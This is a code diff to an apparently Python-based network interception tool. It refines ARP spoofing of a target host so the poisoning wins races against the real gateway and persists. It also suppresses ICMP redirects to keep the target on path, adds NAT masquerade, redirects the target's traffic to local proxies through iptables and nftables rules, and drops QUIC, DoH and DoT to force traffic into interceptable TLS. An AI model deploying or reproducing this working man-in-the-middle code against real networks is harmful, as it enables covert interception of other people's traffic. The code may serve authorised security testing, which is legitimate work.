@@ -96,6 +96,17 @@ def mac_for(ip: str, iface: str, timeout: int = 2) -> str:
 
 
 class ArpSpoofer:
+    """Make this host the target's gateway: tell the target only that the
+    gateway's IP is at our MAC. Its traffic then reaches us, and Netfilter
+    MASQUERADEs what it forwards, so the replies come back through us too.
+
+    The real gateway is left alone. Poisoning it as well (so it sent the
+    target's replies to us) made a home router's fast path bounce the
+    target's packets between it and us and black-hole that flow even after
+    the run stopped. With router mode the gateway only ever sees our own
+    address on our own MAC.
+    """
+
     def __init__(self, env: Env, log):
         self.env = env
         self.log = log
@@ -116,29 +127,32 @@ class ArpSpoofer:
         responder = getattr(self, "responder", None)
         if responder:
             responder.join(timeout=1)
+        e = self.env
         for _ in range(3):
-            self._send_arp(self.env.gateway_ip, self.env.gateway_mac, self.env.target_ip, "ff:ff:ff:ff:ff:ff", broadcast=True)
-            self._send_arp(self.env.target_ip, self.env.target_mac, self.env.gateway_ip, "ff:ff:ff:ff:ff:ff", broadcast=True)
+            # the truth, to the target and broadcast (which also heals caches
+            # an older two-way run left poisoned)
+            self._send_arp(e.gateway_ip, e.gateway_mac, e.target_ip, e.target_mac)
+            self._send_arp(e.gateway_ip, e.gateway_mac, e.target_ip, "ff:ff:ff:ff:ff:ff", broadcast=True)
+            self._send_arp(e.target_ip, e.target_mac, e.gateway_ip, "ff:ff:ff:ff:ff:ff", broadcast=True)
 
     def _respond_loop(self):
-        """Answer ARP who-has for the gateway/target instantly.
+        """Answer the target's who-has for the gateway instantly.
 
-        Periodic gratuitous replies can lose the race against the real gateway
-        (especially right after a neighbor-table flush); replying directly to the
-        request wins deterministically and keeps the poisoning sticky.
+        Periodic replies can lose the race against the real gateway
+        (especially right after a neighbor-table flush); replying directly to
+        the request wins deterministically and keeps the poisoning sticky.
         """
+        e = self.env
+
         def cb(pkt):
             if ARP not in pkt or pkt[ARP].op != 1:  # who-has only
                 return
-            tgt, src = pkt[ARP].pdst, pkt[ARP].psrc
-            if tgt == self.env.gateway_ip and src == self.env.target_ip:
-                self._send_arp(self.env.gateway_ip, self.our_mac, self.env.target_ip, self.env.target_mac)
-            elif tgt == self.env.target_ip and src == self.env.gateway_ip:
-                self._send_arp(self.env.target_ip, self.our_mac, self.env.gateway_ip, self.env.gateway_mac)
+            if pkt[ARP].pdst == e.gateway_ip and pkt[ARP].psrc == e.target_ip:
+                self._send_arp(e.gateway_ip, self.our_mac, e.target_ip, e.target_mac)
         try:
-            sniff(iface=self.env.iface, filter="arp", prn=cb, store=False, stop_filter=lambda _: self.stop.is_set())
-        except Exception as e:
-            self.log.emit("WARN", msg="arp responder failed", error=str(e))
+            sniff(iface=e.iface, filter="arp", prn=cb, store=False, stop_filter=lambda _: self.stop.is_set())
+        except Exception as exc:
+            self.log.emit("WARN", msg="arp responder failed", error=str(exc))
 
     def _loop(self):
         # Aggressive startup burst to win the race against the legitimate gateway
@@ -154,34 +168,53 @@ class ArpSpoofer:
             time.sleep(1)
 
     def _poison(self):
-        self._send_arp(self.env.gateway_ip, self.our_mac, self.env.target_ip, self.env.target_mac)
-        self._send_arp(self.env.target_ip, self.our_mac, self.env.gateway_ip, self.env.gateway_mac)
-        # Unicast ARP requests: Linux targets drop unsolicited replies
-        # (arp_accept=0) and lose the who-has race to the real gateway's
-        # own reply arriving ~1ms later, so a reply-only spoof never
-        # recovers after the target's neighbor entry flips back. A
-        # request is always processed and its sender entry always
-        # cached: ask each side for ITSELF on behalf of the other
-        # (unicast, so bystander caches are untouched).
-        self._send_arp_req(self.env.gateway_ip, self.our_mac, self.env.target_ip, self.env.target_mac)
-        self._send_arp_req(self.env.target_ip, self.our_mac, self.env.gateway_ip, self.env.gateway_mac)
+        e = self.env
+        self._send_arp(e.gateway_ip, self.our_mac, e.target_ip, e.target_mac)
+        # A unicast ARP request too: Linux targets (arp_accept=0) drop
+        # unsolicited replies and lose the who-has race to the real gateway's
+        # own reply ~1ms later, but a request is always processed and its
+        # sender entry always cached. Unicast, so bystanders never see it.
+        self._send_arp_req(e.gateway_ip, self.our_mac, e.target_ip, e.target_mac)
 
     def _send_arp_req(self, psrc: str, hwsrc: str, pdst: str, hwdst: str):
         pkt = ARP(op=1, psrc=psrc, hwsrc=hwsrc, pdst=pdst, hwdst=hwdst)
-        sendp(Ether(src=hwsrc, dst=hwdst) / pkt, iface=self.env.iface, verbose=False)
+        sendp(Ether(src=self.our_mac, dst=hwdst) / pkt, iface=self.env.iface, verbose=False)
 
     def _send_arp(self, psrc: str, hwsrc: str, pdst: str, hwdst: str, broadcast: bool = False):
+        """An ARP reply "psrc is at hwsrc". The Ethernet source is always our
+        own MAC: on Wi-Fi a frame whose source is another station's MAC never
+        makes it onto the air, which would silently lose the restore.
+
+        Poison updates go out directed only: a broadcast reply is processed by
+        every stack on the LAN, so it would repoint the gateway entry of
+        bystander devices too. broadcast=True is for restore(), where healing
+        every cache is the point."""
         pkt = ARP(op=2, psrc=psrc, hwsrc=hwsrc, pdst=pdst, hwdst=hwdst)
-        # Poison updates go out directed ONLY: a broadcast gratuitous reply is
-        # processed by every stack on the LAN, so it repoints the gateway entry
-        # of bystander devices too and hairpins their traffic through us.
-        # Stickiness against neighbor flushes is handled by the responder, which
-        # answers the target's own who-has requests deterministically.
-        # broadcast=True is used solely for restore(), where healing bystander
-        # caches is exactly what we want.
-        sendp(Ether(src=hwsrc, dst=hwdst) / pkt, iface=self.env.iface, verbose=False)
-        if broadcast:
-            sendp(Ether(src=hwsrc, dst="ff:ff:ff:ff:ff:ff") / pkt, iface=self.env.iface, verbose=False)
+        dst = "ff:ff:ff:ff:ff:ff" if broadcast else hwdst
+        sendp(Ether(src=self.our_mac, dst=dst) / pkt, iface=self.env.iface, verbose=False)
+
+
+# Forwarding out the interface a packet came in on makes Linux send the
+# sender an ICMP redirect naming the real gateway, which would take the
+# target off our path. Switched off while we route it, and put back after.
+def quiet_redirects(iface: str) -> dict[str, str]:
+    old = {}
+    for dev in ("all", iface):
+        p = Path(f"/proc/sys/net/ipv4/conf/{dev}/send_redirects")
+        try:
+            old[str(p)] = p.read_text().strip()
+            p.write_text("0\n")
+        except OSError:
+            pass
+    return old
+
+
+def restore_sysctls(old: dict[str, str]):
+    for path, value in old.items():
+        try:
+            Path(path).write_text(value + "\n")
+        except OSError:
+            pass
 
 
 def build_ra_kill(router_ll: str, router_mac: str, prefixes: list[tuple[str, int]] | None = None):
@@ -260,17 +293,23 @@ class IPv6Suppressor:
 
 class Netfilter:
     def __init__(self, env: Env, port: int, redirect_ports: list[int] | None = None,
-                 funnel: bool = False, dns_port: int = 0, dtls_port: int = 0):
+                 funnel: bool = False, dns_port: int = 0, dtls_port: int = 0,
+                 masquerade: bool = False, intercept: bool = True):
         self.env = env
         self.port = port
         self.redirect_ports = redirect_ports or []
         self.funnel = funnel        # drop QUIC/DoH/DoT to force traffic into TCP+TLS
         self.dns_port = dns_port    # >0: REDIRECT target UDP/53 to our DNS responder
         self.dtls_port = dtls_port  # >0: REDIRECT target UDP/5684 to our DTLS proxy
+        self.masquerade = masquerade  # router mode: forward the target under our address
+        self.intercept = intercept  # False: route the target only (passive mode)
         self.rules: list[list[str]] = []
+        self.old_sysctls: dict[str, str] = {}
 
     def enable_forwarding(self):
         Path("/proc/sys/net/ipv4/ip_forward").write_text("1\n")
+        if self.masquerade:
+            self.old_sysctls = quiet_redirects(self.env.iface)
 
     def install(self):
         self.enable_forwarding()
@@ -284,6 +323,7 @@ class Netfilter:
             self._delete_all(self._delete_cmd(rule))
         self.purge_stale()
         Path("/proc/sys/net/ipv4/ip_forward").write_text(self.env.old_forward + "\n")
+        restore_sysctls(self.old_sysctls)
 
     def purge_stale(self):
         """Best-effort removal of Trustfall rules from previous runs."""
@@ -295,6 +335,7 @@ class Netfilter:
         ]
         for spec in exact_filter_specs:
             self._delete_all(["iptables", "-D", *spec])
+        self._delete_all(["iptables", "-t", "nat", "-D", *self._masquerade_spec()])
 
         self._purge_saved_rules(
             "filter",
@@ -311,13 +352,21 @@ class Netfilter:
                  or (self.dtls_port and f"--to-ports {self.dtls_port}" in line)),
         )
 
+    def _masquerade_spec(self) -> list[str]:
+        e = self.env
+        return ["POSTROUTING", "-s", e.target_ip, "-o", e.iface, "-j", "MASQUERADE"]
+
     def _desired_rules(self) -> list[list[str]]:
         e = self.env
         rules = [
-            ["iptables", "-I", "INPUT", "1", "-i", e.iface, "-s", e.target_ip, "-p", "tcp", "--dport", str(self.port), "-j", "ACCEPT"],
             ["iptables", "-I", "FORWARD", "1", "-i", e.iface, "-s", e.target_ip, "-j", "ACCEPT"],
             ["iptables", "-I", "FORWARD", "1", "-o", e.iface, "-d", e.target_ip, "-j", "ACCEPT"],
         ]
+        if self.masquerade:
+            rules.append(["iptables", "-t", "nat", "-A", *self._masquerade_spec()])
+        if not self.intercept:
+            return rules
+        rules.insert(0, ["iptables", "-I", "INPUT", "1", "-i", e.iface, "-s", e.target_ip, "-p", "tcp", "--dport", str(self.port), "-j", "ACCEPT"])
         redirect_ports = self.redirect_ports or [None]
         for port in redirect_ports:
             rule = ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", e.iface, "-s", e.target_ip, "-p", "tcp"]
@@ -401,16 +450,22 @@ class NfTables:
     TABLE = APP
 
     def __init__(self, env: Env, port: int, redirect_ports: list[int] | None = None,
-                 funnel: bool = False, dns_port: int = 0, dtls_port: int = 0):
+                 funnel: bool = False, dns_port: int = 0, dtls_port: int = 0,
+                 masquerade: bool = False, intercept: bool = True):
         self.env = env
         self.port = port
         self.redirect_ports = redirect_ports or []
         self.funnel = funnel
         self.dns_port = dns_port
         self.dtls_port = dtls_port
+        self.masquerade = masquerade
+        self.intercept = intercept
+        self.old_sysctls: dict[str, str] = {}
 
     def enable_forwarding(self):
         Path("/proc/sys/net/ipv4/ip_forward").write_text("1\n")
+        if self.masquerade:
+            self.old_sysctls = quiet_redirects(self.env.iface)
 
     def install(self):
         self.enable_forwarding()
@@ -420,6 +475,7 @@ class NfTables:
     def cleanup(self):
         self.purge_stale()
         Path("/proc/sys/net/ipv4/ip_forward").write_text(self.env.old_forward + "\n")
+        restore_sysctls(self.old_sysctls)
 
     def purge_stale(self):
         """Idempotent removal of our table left over from a previous run."""
@@ -436,14 +492,18 @@ class NfTables:
         if self.dtls_port:
             input_rules.append(f"ip saddr {e.target_ip} udp dport {self.dtls_port} accept")
         # funnel drops first (terminal), then broad target accepts
-        forward_rules = self._funnel_rules() + [
+        forward_rules = (self._funnel_rules() if self.intercept else []) + [
             f"ip saddr {e.target_ip} accept",
             f"ip daddr {e.target_ip} accept",
         ]
         lines = [f"table ip {self.TABLE} {{"]
-        lines += self._chain("prerouting", "type nat hook prerouting priority dstnat; policy accept;", self._redirect_rules())
-        lines += self._chain("input", "type filter hook input priority filter; policy accept;", input_rules)
+        if self.intercept:
+            lines += self._chain("prerouting", "type nat hook prerouting priority dstnat; policy accept;", self._redirect_rules())
+            lines += self._chain("input", "type filter hook input priority filter; policy accept;", input_rules)
         lines += self._chain("forward", "type filter hook forward priority filter; policy accept;", forward_rules)
+        if self.masquerade:
+            lines += self._chain("postrouting", "type nat hook postrouting priority srcnat; policy accept;",
+                                 [f'ip saddr {e.target_ip} oifname "{e.iface}" masquerade'])
         lines.append("}")
         return lines
 
